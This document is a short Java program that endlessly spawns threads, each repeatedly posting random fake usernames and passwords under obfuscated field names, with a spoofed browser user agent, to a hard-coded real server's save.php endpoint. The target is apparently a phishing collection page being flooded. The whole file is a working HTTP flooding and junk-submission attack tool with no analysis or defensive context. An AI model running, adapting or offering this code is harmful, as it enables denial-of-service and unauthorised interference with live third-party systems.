import java.io.*;
import java.util.*;
import java.util.concurrent.*;
import java.net.*;

public class Case4 {
    public static String gP() {
        Random r = new Random();
        StringBuilder sb = new StringBuilder();
        for (int i = 1; i <= r.nextInt(10) + 8; i++) {
            sb.append((char) ('a' + r.nextInt(26)));
        }
        // System.out.println(sb.toString());
        return sb.toString();
    }

    public static String gU() {
        Random r = new Random();
        StringBuilder sb = new StringBuilder();
        sb.append(r.nextInt(99900000) + 100000);
        // System.out.println(sb.toString());
        return sb.toString();
    }

    static URL t;
    static {
        try {
            t = new URL("http://5b3a49d6-1.cd.1257014834.clb.myqcloud.com/save.php");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    static volatile long cnt = 0;
    static Runnable run = new Runnable() {

        @Override
        public void run() {
            while (true) {
                try {
                    PrintWriter out = null;
                    BufferedReader in = null;
                    HttpURLConnection conn = (HttpURLConnection) t.openConnection();
                    conn.setRequestProperty("Accept", "*/*");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("User-Agent",
                            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0");
                    conn.setDoOutput(true);
                    conn.setDoInput(true);
                    conn.setInstanceFollowRedirects(false);
                    out = new PrintWriter(conn.getOutputStream());
                    out.print("ip=&hrUW3PG7mp3RLd3dJu=" + gU() + "&LxMzAX2jog9Bpjs07jP=" + gP());
                    out.flush();
                    /*
                     * String result = ""; in = new BufferedReader(new
                     * InputStreamReader(conn.getInputStream())); String line; while ((line =
                     * in.readLine()) != null) { result += line; } // System.out.println(result);
                     * FileOutputStream fos=new FileOutputStream(new File("result.html"));
                     * fos.write(result.getBytes()); fos.close();
                     */
                    /*
                     * String location = conn.getHeaderField("Location");
                     * System.out.println(location);
                     */
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    // e.printStackTrace();
                    cnt++;
                }
                if (cnt >= 10) {
                    cnt--;
                    try {
                        Thread.sleep(500);
                    } catch (Exception e) {
                    }
                }
            }
        }
    };

    public static void main(String[] args) throws Exception {
        while (true) {
            ExecutorService cachedThreadPool = new ThreadPoolExecutor(0, Integer.MAX_VALUE, Long.MAX_VALUE,
                    TimeUnit.SECONDS, new SynchronousQueue<Runnable>());

            cachedThreadPool.execute(() -> {
                run.run();
            });
            while (cnt != 0) {
                Thread.sleep(500);
                cnt--;
            }
            Thread.sleep(500);
        }
    }

}
